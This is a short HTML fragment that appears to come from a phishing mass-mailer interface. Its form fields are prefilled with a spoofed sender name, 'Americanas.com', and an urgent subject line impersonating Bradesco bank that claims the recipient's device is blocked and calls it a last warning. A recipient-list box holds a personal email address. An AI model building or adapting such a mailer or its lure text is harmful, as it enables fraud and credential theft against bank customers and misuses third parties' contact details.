...
<table width="720" height="496" border="0">
  <tr>
  <td><input type="text" name="nome" value="Americanas.com" required focus /></td>
    ...
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Assunto: 
      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" value="Infoemail Bradesco Varejo - Dispositivo bloqueado (Ultimo Aviso)" />
    </p>
    ...
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">HTML:
      ...
      *.*Lista
      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails">xampu182@hotmail.com
</textarea>
    </p>
